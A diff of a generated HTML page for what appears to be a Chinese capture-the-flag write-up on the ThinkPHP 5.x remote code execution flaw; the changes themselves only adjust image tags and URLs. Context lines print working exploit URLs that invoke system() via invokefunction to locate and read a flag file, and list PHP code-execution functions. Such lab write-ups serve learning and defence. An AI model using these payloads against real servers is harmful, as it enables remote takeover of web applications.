@@ -243,7 +243,7 @@
         
         <div class="entry-content">
           <p>第一次见thinkPHP，以前只有听过</p>
-<p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309160713.jpg" alt="QQ截图20200309160713"></p>
+<p><img data-action="zoom" src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ截图20200309160713.jpg" alt="QQ截图20200309160713"></p>
 <a id="more"></a>
 
 <p>刚看到还以为我容器坏了…其实并没有</p>
@@ -255,9 +255,9 @@
 服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</code></pre><p>页面也说明了是ThinkPHP V5版本  百度得知这个版本的确有远程代码执行漏洞</p>
 <pre><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</code></pre><p>直接上payload</p>
 <p>查找flag</p>
-<pre><code>http://111.198.29.45:43736/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot;</code></pre><p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309162510.jpg" alt="QQ截图20200309162510"></p>
+<pre><code>http://111.198.29.45:43736/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot;</code></pre><p><img data-action="zoom" src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ截图20200309162510.jpg" alt="QQ截图20200309162510"></p>
 <p>cat</p>
-<pre><code>http://111.198.29.45:43736/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></pre><p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309162435.jpg" alt="QQ截图20200309162435"></p>
+<pre><code>http://111.198.29.45:43736/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></pre><p><img data-action="zoom" src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ截图20200309162435.jpg" alt="QQ截图20200309162435"></p>
 <p>附上一些查找到的函数</p>
 <pre><code>PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()
 
@@ -289,7 +289,7 @@
               <div class="background">
 <!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/e9f33c2c502ab43804964ce7edd431f9.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/6f005cbc1865ff1b706aba57347988ab.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Previous Post</span>
